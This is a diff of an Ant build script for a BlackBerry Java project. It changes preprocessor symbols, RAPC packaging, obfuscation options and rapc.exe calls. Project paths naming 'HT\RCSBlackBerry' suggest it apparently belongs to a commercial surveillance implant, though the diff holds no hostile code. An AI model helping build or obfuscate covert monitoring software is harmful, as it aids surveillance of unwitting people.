@@ -29,10 +29,9 @@
 	DBC: verifiche Design by contract
 	FAKECONF: configurazione presa da codice
 	DEMO: versione demo, a meno di binary patch
-	NODEMO: inibisce la demo.
-	
+	NODEMO: inibisce la demo.	
 	-->
-	<property name="preprocess.debug.symbols" value="DEBUG,NODEMO,DBC,FAKECONF" />
+	<property name="preprocess.debug.symbols" value="DEBUG,NODEMO,DBC" />
 	<property name="preprocess.test.symbols" value="TEST" />
 	<property name="preprocess.release.symbols" value="RELEASE,DEMO" />
 
@@ -112,19 +111,26 @@
 			<wtkjad jadfile="${builddir}/lib.jad" jarfile="${builddir}/lib.jar" name="${lib.codename}" vendor="${ht.vendor}" version="${ht.version}">
 				<attribute name="MicroEdition-Configuration" value="CLDC-${wtk.cldc.version}" />
 				<attribute name="MicroEdition-Profile" value="MIDP-${wtk.midp.version}" />
+				<attribute name="RIM-Library-Flags" value="2" />
 			</wtkjad>
+			
+	         <!-- Create a RAPC file. -->
+	            <manifest file="${builddir}/lib.rapc">
+	                <attribute name="MIDlet-Name" value="${core.codename}" />
+	                <attribute name="MIDlet-Version" value="${ht.version}" />
+	                <attribute name="MIDlet-Vendor" value="${ht.vendor}" />
+	                <attribute name="MIDlet-Jar-URL" value="lib.jar" />
+	                <attribute name="MIDlet-Jar-Size" value="0" />
+	                <attribute name="MicroEdition-Profile" value="MIDP-${wtk.midp.version}" />
+	                <attribute name="MicroEdition-Configuration" value="CLDC-${wtk.cldc.version}" />
+	                <attribute name="RIM-Library-Flags" value="2" />
+	            </manifest>
 
 			<!-- Preprocess. -->
 			<preprocess dir.src="${lib.src}" dir.to="${builddir}/preprocessed" />
 
 			<!-- Compile everything, but don't preverify (yet). -->
-			<wtkbuild srcdir="${builddir}/preprocessed" destdir="${builddir}/unverified" preverify="false">
-				<classpath>
-					<path id="lib.classpath">
-						<path location="${net_rim_api.jar}" />
-					</path>
-				</classpath>
-			</wtkbuild>
+			<wtkbuild srcdir="${builddir}/preprocessed" destdir="${builddir}/unverified" preverify="false"/>
 
 			<!-- Package our newly compiled classes. -->
 			<wtkpackage jarfile="${builddir}/lib.jar" jadfile="${builddir}/lib.jad">
@@ -141,6 +147,22 @@
 			<mkdir dir="output/@{version}" />
 			<wtkrapc jadfile="${builddir}/lib.jad" source="${builddir}/lib.jar" codename="${lib.codename}" import="${net_rim_api.jar}" destdir="output/@{version}" midlet="false" library="true" />
 
+			<!--
+			rapc.exe -nomain library=deliverables\Standard\4.5.0\net_rim_bb_lib_base 
+			deliverables\Standard\4.5.0\net_rim_bb_lib_base.rapc 
+			-sourceroot=C:\HT\RCSBlackBerry\Workspace\RCSBlackBerryResources\src;C:\HT\RCSBlackBerry\Workspace\RCSBlackBerryResources\res 
+			-import=C:\Developer\eclipse_bb\plugins\net.rim.ejde.componentpack4.5.0_4.5.0.28\components\lib\net_rim_api.jar 
+			C:\HT\RCSBlackBerry\Workspace\RCSBlackBerryResources\bin
+
+	         <exec dir="${builddir}" executable="${bb.buildjars.home}/rapc.exe" failonerror="true">
+	                <arg value="-nomain" />
+	                <arg value="import=${net_rim_api.jar}" />
+	                <arg value="codename=${lib.codename}" />
+	                <arg file="${builddir}/lib.rapc" />
+	                <arg file="${builddir}/lib.jar" />
+	            </exec>
+			-->
+			
 			<copy file="${builddir}/lib.jar" tofile="output/@{version}/${lib.codename}.jar" />
 			<move todir="${builddir}">
 				<fileset dir=".">
@@ -206,7 +228,6 @@
 			<!-- Compile everything, but don't preverify (yet). -->
 			<echo>lib: "output/@{version}/${lib.codename}.jar" </echo>
 			<wtkbuild srcdir="${builddir}/preprocessed" destdir="${builddir}/unverified" preverify="true" bootclasspath="${net_rim_api.jar}">
-
 				<classpath>
 					<path id="core.classpath">
 						<path location="${net_rim_api.jar}" />
@@ -224,10 +245,10 @@
 			<!-- Obfuscate -dontshrink -->
 			<wtkobfuscate jarfile="${builddir}/core.jar" jadfile="${builddir}/core.jad" if="false">
 				<classpath refid="core.classpath" />
-				<argument value="'-keep public class blackberry.Main{
-							public static void main(java.lang.String[]);
-							}'" />
-				<argument value="-shrink -dontusemixedcaseclassnames -dontnote -repackageclasses 'blackberry' -overloadaggressively -allowaccessmodification -microedition" />
+				<argument value="-keep public class blackberry.Main" />
+				<argument value="-keep public class ** extends javax.microedition.midlet.MIDlet { public *; }" />
+				<argument value="-repackageclasses '' -allowaccessmodification -microedition -dontusemixedcaseclassnames" />
+				<argument value="-printusage" />
 			</wtkobfuscate>
 
 			<!-- Preverify -->
@@ -237,15 +258,20 @@
 
 			<!-- Rapc 
 			<wtkrapc jadfile="${builddir}/core.jad" source="${builddir}/core.jar" codename="${core.codename}" import="${net_rim_api.jar};output/@{version}/lib.jar" destdir="${builddir}" quiet="true" midlet="false" library="false" />
+			rapc.exe -cr codename=deliverables\Standard\4.5.0\net_rim_bb_lib 
+			deliverables\Standard\4.5.0\net_rim_bb_lib.rapc 
+			-sourceroot=C:\HT\RCSBlackBerry\Workspace\RCSBlackBerry\src;C:\HT\RCSBlackBerry\Workspace\RCSBlackBerry\src\blackberry 
+			-import=C:\Developer\eclipse_bb\plugins\net.rim.ejde.componentpack4.5.0_4.5.0.28\components\lib\net_rim_api.jar;C:\HT\RCSBlackBerry\Workspace\RCSBlackBerryResources\deliverables\Standard\4.5.0\net_rim_bb_lib_base.jar 
+			C:\HT\RCSBlackBerry\Workspace\RCSBlackBerry\bin
+					
 			-->
 
 			<exec dir="${builddir}" executable="${bb.buildjars.home}/rapc.exe" failonerror="true">
 				<arg value="-quiet" />
-				<arg value="import=${net_rim_api.jar}" />
+				<arg value="-import=${net_rim_api.jar};${builddir}/../../../../output/@{version}/${lib.codename}.jar" />
 				<arg value="codename=${core.codename}" />
 				<arg file="${builddir}/core.rapc" />
 				<arg file="${builddir}/core.jar" />
-				<arg file="output/@{version}/${lib.codename}.jar" />
 			</exec>
 
 			<copy file="preprocess/signature.csl" tofile="${builddir}/${core.codename}.csl" />
@@ -263,9 +289,6 @@
 			<mkdir dir="output/@{version}/@{kind}" />
 			<copy file="${builddir}/${core.codename}.cod" todir="output/@{version}/@{kind}" />
 			<copy file="output/@{version}/${lib.codename}.cod" todir="output/@{version}/@{kind}" />
-
-
-
 		</sequential>
 	</macrodef>
 
